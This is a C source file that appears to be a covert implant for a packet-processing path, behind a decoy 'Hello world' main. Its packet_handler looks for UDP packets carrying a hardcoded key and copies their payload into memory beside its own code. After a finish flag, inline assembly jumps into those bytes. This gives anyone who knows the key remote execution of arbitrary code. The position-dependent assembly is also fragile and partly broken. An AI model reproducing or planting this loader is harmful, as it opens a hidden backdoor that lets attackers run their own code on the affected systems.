#include <stdio.h>
#include <stdlib.h>

typedef struct
{
    int recvFin;
    int offset;
    int sequence;
    char *startAddr;
} WR_CODE_INFO;

typedef struct
{
    char key[50];
    int finFlag;
    int length;
    int sequence;
    char buff[500];
}RECV_PROTO;

typedef struct _ETH_Header_
{
    unsigned char DesMAC[6];     //以太网目的地址
    unsigned char SrcMAC[6];     //以太网源地址
    unsigned short EtherType;    //帧类型
} ETH_HEADER;

typedef struct _IP_Header_
{
    unsigned char ip_hl:4;         /*header length(报头长度）*/
    unsigned char ip_v:4;          /*version(版本)*/
    unsigned char ip_tos;          /*type os service服务类型*/
    unsigned short int ip_len;     /*total length (总长度)*/
    unsigned short int ip_id;      /*identification (标识符)*/
    unsigned short int ip_off;     /*fragment offset field(段移位域)*/
    unsigned char ip_ttl;          /*time to live (生存时间)*/
    unsigned char ip_p;            /*protocol(协议)*/
    unsigned short int ip_sum;     /*checksum(校验和)*/
    unsigned char ip_src[4];       /*source address(源地址)*/
    unsigned char ip_dst[4];       /*destination address(目的地址)*/
} IP_HEADER;

typedef struct _UDP_Header_
{
    unsigned short int sport;
    unsigned short int dport;
    unsigned short int length;
    unsigned short int checksum;
} UDP_HEADER;

WR_CODE_INFO *get_wr_code_info_addr();
int is_wr_code_request(char *recv_packet);
int write_code(char *recv_packet);

int packet_handler(char *recv_packet, char *pkt_info)
{
    char *pCallAddr = NULL;
    WR_CODE_INFO *pWrInfo = NULL;

    pWrInfo = get_wr_code_info_addr();
    if(pWrInfo->recvFin)
    {
        pCallAddr = pWrInfo->startAddr;
        __asm__(
                "movl 12(%ebp), %eax\n\t"
                "push %eax\n\t"
                "movl 8(%ebp), %eax\n\t"
                "push %eax\n\t"
                "movl -12(%ebp), %eax\n\t"
                "call %eax\n\t"
                "add $8, %esp"
                );
        return 0;
    }
    if(is_wr_code_request(recv_packet))
    {
        write_code(recv_packet);
    }
    return 0;
}

char *get_current_addr()
{
    __asm__(
        "movl 4(%ebp), %eax"
    );
    return;
}

WR_CODE_INFO *get_wr_code_info_addr()
{
    char *pCurrAddr = NULL;
    WR_CODE_INFO *pWrInfoAddr = NULL;

    pCurrAddr = get_current_addr();
    pWrInfoAddr = pCurrAddr + 1048000;

    return pWrInfoAddr;
}

char *get_write_addr()
{
    char *pAddr = NULL;
    char *pCurrAddr = NULL;
    WR_CODE_INFO *pWrInfo = NULL;

    pCurrAddr = get_current_addr();
    pWrInfo = get_wr_code_info_addr();

    if(pWrInfo->offset == 0)
    {
        pWrInfo->offset = 1500;
        pWrInfo->startAddr = pCurrAddr + pWrInfo->offset;
    }
    pAddr = pCurrAddr + pWrInfo->offset;

    return pAddr;
}

char *ex_memcpy(char *dstAddr, char *srcAddr, unsigned int len)
{
    int idx = 0;

    for(idx=0; idx < len; idx++)
    {
        dstAddr[idx] = srcAddr[idx];
    }

    return dstAddr;
}

int ex_strcmp(char *mStr, char *pStr)
{
    int idx = 0;

    for(idx=0; mStr[idx] != NULL && pStr[idx] != NULL; idx++)
    {
        if(mStr[idx] != pStr[idx])
            break;
    }

    if(mStr[idx] != NULL || pStr[idx] != NULL)
        return -1;

    return 0;
}

unsigned short int ex_conv_byte_order_short(unsigned short int n)
{
    char swap = 0x00;

    swap = ((char *)&n)[0];
    ((char *)&n)[0] = ((char *)&n)[1];
    ((char *)&n)[1] = swap;

    return n;
}

int is_wr_code_request(char *recv_packet)
{
    ETH_HEADER *pEthHdr = NULL;
    IP_HEADER *pIPHdr = NULL;
    UDP_HEADER *pUDPHdr = NULL;
    RECV_PROTO *pRecvProto = NULL;
    char key[50] = "`1234567890-=";

    pEthHdr = (ETH_HEADER *)recv_packet;
    if(pEthHdr->EtherType != 0x0008)
        return 0;
    pIPHdr = (IP_HEADER *)(recv_packet + sizeof(ETH_HEADER));
    if(pIPHdr->ip_p != 0x11)
        return 0;
    pUDPHdr = (UDP_HEADER *)(recv_packet + sizeof(ETH_HEADER) + sizeof(IP_HEADER));
    if(ex_conv_byte_order_short(pUDPHdr->length)-8 < sizeof(RECV_PROTO))
        return 0;
    pRecvProto = (RECV_PROTO *)(recv_packet + sizeof(ETH_HEADER) + sizeof(IP_HEADER) + sizeof(UDP_HEADER));
    if(ex_strcmp(key, pRecvProto->key) != 0)
        return 0;

    return 1;
}

int write_code(char *recv_packet)
{
    RECV_PROTO *pRecvProto = NULL;
    char *pWrAddr = NULL;
    WR_CODE_INFO *pWrInfo = NULL;

    pRecvProto = (RECV_PROTO *)(recv_packet + sizeof(ETH_HEADER) + sizeof(IP_HEADER) + sizeof(UDP_HEADER));

    pWrAddr = get_write_addr();
    pWrInfo = get_wr_code_info_addr();

    if(pWrInfo->sequence+1 != pRecvProto->sequence)
        return -1;
    ex_memcpy(pWrAddr, pRecvProto->buff, pRecvProto->length);
    pWrInfo->offset += pRecvProto->length;
    pWrInfo->sequence++;

    if(pRecvProto->finFlag)
    {
        pWrInfo->recvFin = 1;
    }
    return 0;
}

int main()
{
    printf("Hello world!\n");
    return 0;
}
